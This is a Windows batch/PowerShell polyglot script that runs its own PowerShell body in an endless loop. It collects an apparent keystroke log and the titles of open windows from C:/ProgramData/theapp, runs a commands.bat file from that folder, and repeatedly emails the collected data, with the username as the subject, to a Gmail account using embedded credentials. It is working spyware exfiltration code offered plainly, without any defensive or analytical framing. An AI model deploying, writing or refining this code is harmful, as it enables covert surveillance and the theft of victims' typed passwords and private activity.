;@echo off
;Findstr -rbv ; %0 | powershell -c - 
;goto:sCode

Function Send-EMail {
    Param (
        [Parameter(`
            Mandatory=$true)]
        [String]$EmailTo,
        [Parameter(`
            Mandatory=$true)]
        [String]$Subject,
        [Parameter(`
            Mandatory=$true)]
        [String]$Body,
        [Parameter(`
            Mandatory=$true)]
        [String]$EmailFrom,
        [Parameter(`
            mandatory=$false)]
        [String]$attachment,
        [Parameter(`
            mandatory=$true)]
        [String]$Password
    )

        $SMTPServer = "smtp.gmail.com" 
        $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
        if ($attachment -ne $null) {
            $SMTPattachment = New-Object System.Net.Mail.Attachment($attachment)
            $SMTPMessage.Attachments.Add($SMTPattachment)
        }
        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
        $SMTPClient.EnableSsl = $true 
        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom.Split("@")[0], $Password); 
        $SMTPClient.Send($SMTPMessage)
        Remove-Variable -Name SMTPClient
        Remove-Variable -Name Password

}

$email="gmailusername"
$mypass="gmailpass"

$n=0
$n2=0
$text=""
$theattachtment_1=""
$subject=whoami

While($true){
Start-Sleep -s 0.5
$n2=$n2+1

if ($n2 -eq 40) {
$theattachtment = 'C:/ProgramData/theapp/prc'+$n+'.txt'
Add-Content $theattachtment $theattachtment_1
Add-Content $theattachtment (Get-Date -Format g)
Add-Content $theattachtment (get-process | where-object {$_.mainwindowhandle -ne 0} | select-object name, mainwindowtitle)
$theattachtment_1=Get-Content $theattachtment -Raw
copy C:\ProgramData\theapp\log.txt C:\ProgramData\theapp\logcopy.txt
$text = Get-Content C:\ProgramData\theapp\logcopy.txt -Raw
}

cmd.exe /c C:\ProgramData\theapp\commands.bat

if ($text -eq $null) {
        $text="no typing yet"
}
if ($n2 -eq 40) {
Send-EMail -EmailFrom ($email+"@gmail.com") -EmailTo ($email+"@gmail.com") -Body $text -Subject $subject -Password $mypass -attachment $theattachtment;
$n=$n+1;
$n2=0;
}

}

;:sCode 
;goto :eof